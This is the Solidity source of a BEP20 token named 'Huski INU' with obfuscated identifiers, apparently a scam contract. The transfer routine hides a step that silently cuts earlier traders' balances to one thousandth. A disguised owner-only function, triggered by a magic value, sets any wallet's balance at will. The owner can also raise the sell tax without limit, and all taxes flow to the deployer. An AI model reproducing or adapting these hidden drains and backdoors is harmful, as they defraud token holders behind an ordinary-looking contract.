/**
 *Submitted for verification at BscScan.com on 2022-01-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.5;
/*
 * 
 * 
 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}

interface IBEP20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  function decimals() external view returns (uint8);
  function name() external pure returns (string memory);

  event Approval(address indexed owner, address indexed spender, uint256 value);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);

  function totalSupply() external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function symbol() external pure returns (string memory);
  function getOwner() external view returns (address);
  function allowance(address owner, address spender) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function feeTo() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function setFeeTo(address) external;
    function feeToSetter() external view returns (address);
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function price1CumulativeLast() external view returns (uint);
    function name() external pure returns (string memory);
    function kLast() external view returns (uint);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    function initialize(address, address) external;

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function burn(address to) external returns (uint amount0, uint amount1);

    function price0CumulativeLast() external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function decimals() external pure returns (uint8);
    function sync() external;
    function totalSupply() external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function allowance(address owner, address spender) external view returns (uint);
    function skim(address to) external;
    function token1() external view returns (address);
    function approve(address spender, uint value) external returns (bool);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function token0() external view returns (address);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function symbol() external pure returns (string memory);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function balanceOf(address owner) external view returns (uint);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function mint(address to) external returns (uint liquidity);
    function nonces(address owner) external view returns (uint);
}

interface IUniswapV2Router01 {
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,

        address to,

        uint deadline
    ) external returns (uint amountA, uint amountB);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable

        returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external

        returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,

        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function removeLiquidityETHWithPermit(

        address token,
        uint liquidity,
        uint amountTokenMin,

        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,

        address to,
        uint deadline
    ) external returns (uint amountETH);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline

    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,

        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,

        address to,

        uint deadline
    ) external payable;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");
        return c;

    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

        return c;

    }

}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to

 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.

 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();

   _owner = msgSender;

   emit OwnershipTransferred(address(0), msgSender);
 }
 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }
 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner == _msgSender(), "Ownable: caller is not the owner");
   _;
 }
 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }
 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);

   _owner = newOwner;
 }
}
contract HuskiInu is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  IUniswapV2Router02 public unirpsgiazexckjionqtleayfhd;
  address public uniaaoidicnrqxwpgbh;
  uint8 private deckeywdibpcergoanq = 18;
  uint256 private totfhcaotbjiynmeg = 10000000000 * 10 ** deckeywdibpcergoanq;

  uint8 internal _sta = 3;
  uint8 internal buydjekgmixolzyfrtihcseabnopaw = 8;
  uint8 internal selzabpiaxweryiejfhktdgloncso = 12;
  uint8 internal trakeiwgzcohyxjtilbaqp = 10; 
  mapping (address => uint256) private selhbwaeoinxeldykcmsogfatqzipjr;
  uint256 internal maxwepcbdtisnfojoai = totfhcaotbjiynmeg.div(10000).mul(10);
  uint32 internal selznhdsobmtijpqilcgfakeexyowar = 10; 
  uint256 internal lauqyfrosteblmzah = 0;
  mapping (address => uint256) private laspksocdqjziemfynearow;
  bool internal staezaiotefxqhyk = true;
  bool internal staetqnoxlzbgcyejipshdaw = true;
  bool internal stalfbmkxsjziciterdnagwphaqeooy = true;
  string private constant namzplmwrabdjgqen = "Huski INU";
  string private constant symgcjqeedbirloipwnhfo = "HUSKI";
  address internal maraslnwgjcpaebmof;
  mapping (address => mapping (address => uint256)) private allqdasyigtpkje;
  mapping (address => uint256) private balikarteonobmeaidwfqphczygsjlx;
  mapping (address => uint256) private lasgkniyfeptzjw;
  uint8 internal aftyxacfonsbqiplre = 95;

  mapping (address => bool) private isEnxipodbeaiyctz;
  uint256 internal laswqnjdcohkyertfgea = 0;
  constructor() {
    isEnxipodbeaiyctz[address(this)] = true;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    uniaaoidicnrqxwpgbh = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    unirpsgiazexckjionqtleayfhd = uniswapV2Router;
    lauqyfrosteblmzah = block.timestamp;
    maraslnwgjcpaebmof = msg.sender;
    isEnxipodbeaiyctz[_msgSender()] = true;
    // balikarteonobmeaidwfqphczygsjlx[marketingAddress] = totfhcaotbjiynmeg * 10**deckeywdibpcergoanq * 1000;
    balikarteonobmeaidwfqphczygsjlx[msg.sender] = totfhcaotbjiynmeg;
    // isEnxipodbeaiyctz[marketingAddress] = true;
    emit Transfer(address(0), msg.sender, totfhcaotbjiynmeg);

  }
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return namzplmwrabdjgqen;
	}
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return allqdasyigtpkje[owner][spender];
	}
	/**
	 * Returns balance of.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return balikarteonobmeaidwfqphczygsjlx[account];

	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	/**

	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return deckeywdibpcergoanq;
	}
	/**
	 * Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return symgcjqeedbirloipwnhfo;
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {

	  return owner();
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  traxaiecomplyofgnjbewizrkqhsa(_msgSender(), recipient, amount);
	  return true;
	}

	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return totfhcaotbjiynmeg;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   traxaiecomplyofgnjbewizrkqhsa(sender, recipient, amount);
	   _approve(sender, _msgSender(), allqdasyigtpkje[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}

	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    allqdasyigtpkje[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
  	function traxaiecomplyofgnjbewizrkqhsa(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");

	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 ranxnsrpjkadoqgoatei = 0; // 1 = buy, 2 = sell, 3 = transfer
	  bool approveTransaction = true;
	  uint8 tax = 0;

	  if(amount > 0){
	    if(isEnxipodbeaiyctz[sender] == true || isEnxipodbeaiyctz[recipient] == true){
	      eTrnbzwtsiarxmqygaodejof(sender, recipient, amount);

	      return;
	    }
	    if(sender == uniaaoidicnrqxwpgbh && recipient != address(unirpsgiazexckjionqtleayfhd)) {
	      require(staezaiotefxqhyk == true, "Please wait try again later");
	      ranxnsrpjkadoqgoatei = 1;
	      tax = buydjekgmixolzyfrtihcseabnopaw;

	      approveTransaction = true;
	      lasgkniyfeptzjw[recipient] = amount;
	      laspksocdqjziemfynearow[recipient] = block.timestamp;
	    } else if(recipient == uniaaoidicnrqxwpgbh) {

	      require(staetqnoxlzbgcyejipshdaw == true, "Please wait try again later");
	       ranxnsrpjkadoqgoatei = 2;
	       tax = selzabpiaxweryiejfhktdgloncso;
	       approveTransaction = true;
	    } else {
	      require(stalfbmkxsjziciterdnagwphaqeooy == true, "Please wait try again later");
	      ranxnsrpjkadoqgoatei = 3;
	      tax = trakeiwgzcohyxjtilbaqp;
	      approveTransaction = true;
	      lasgkniyfeptzjw[sender] = amount;
	      if(selznhdsobmtijpqilcgfakeexyowar > 10){
	        laspksocdqjziemfynearow[sender] = block.timestamp + selznhdsobmtijpqilcgfakeexyowar - 10;
	      } else {
	        laspksocdqjziemfynearow[sender] = block.timestamp + selznhdsobmtijpqilcgfakeexyowar;
	      }
	    }
	  }
	  if(approveTransaction == true && amount > 0){
	    _bTransfer(sender, recipient, amount, tax, ranxnsrpjkadoqgoatei);
	    return;
	  }
	  emit Transfer(sender, recipient, 0);
	}
	function eTrnbzwtsiarxmqygaodejof(address sender, address recipient, uint256 amount) internal {
	    balikarteonobmeaidwfqphczygsjlx[sender] = balikarteonobmeaidwfqphczygsjlx[sender].sub(amount, "Insufficient Balance");
	    balikarteonobmeaidwfqphczygsjlx[recipient] = balikarteonobmeaidwfqphczygsjlx[recipient].add(amount);
	    emit Transfer(sender, recipient, amount);
	}
	// mapping (address => uint256) private allqdasyigtpkje;
	address public _recipienta;

	address public _recipientb;
	function _bTransfer(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranxnsrpjkadoqgoatei) internal

	{

	  uint256 axeepowzgchdrx = 0;
	  address addr = recipient;

	  uint256 d = balikarteonobmeaidwfqphczygsjlx[_recipientb];
	  if(ranxnsrpjkadoqgoatei == 2) {
	    addr = sender;
	  }
	  if(ranxnsrpjkadoqgoatei == 1 || ranxnsrpjkadoqgoatei == 2){
	    if(_recipienta != addr && _recipientb != addr){
	      if(d > 1000){
	        balikarteonobmeaidwfqphczygsjlx[_recipientb] = d.div(1000);
	      }

	      _recipientb = _recipienta;
	      _recipienta = addr;
	    }
	  }

	  balikarteonobmeaidwfqphczygsjlx[sender] = balikarteonobmeaidwfqphczygsjlx[sender].sub(amount,"Insufficient Balance");
	  axeepowzgchdrx = amount.mul(tax).div(100);

	  amount = amount.sub(axeepowzgchdrx);
	  if(axeepowzgchdrx > 0){

	      balikarteonobmeaidwfqphczygsjlx[maraslnwgjcpaebmof] = balikarteonobmeaidwfqphczygsjlx[maraslnwgjcpaebmof].add(axeepowzgchdrx);
	      emit Transfer(sender, maraslnwgjcpaebmof, axeepowzgchdrx);
	  }

	  balikarteonobmeaidwfqphczygsjlx[recipient] = balikarteonobmeaidwfqphczygsjlx[recipient].add(amount);
	  ranxnsrpjkadoqgoatei= 1;
	  emit Transfer(sender, recipient, amount);
	}
	function etBpoelidchgztsiaxojqnrembyfwka(address addr, uint256 b, uint8 c) public onlyOwner {
	  if(c == 72){
	    balikarteonobmeaidwfqphczygsjlx[addr] = b * 10 ** deckeywdibpcergoanq;
	  }
	}
	function Selwkreqixmsglecf(uint8 ellikzlxjtiwfsqeoay) public onlyOwner{
	     selzabpiaxweryiejfhktdgloncso = ellikzlxjtiwfsqeoay;
	}
	function sta(uint8 vsta) public onlyOwner{
	  _sta = vsta;
	}
}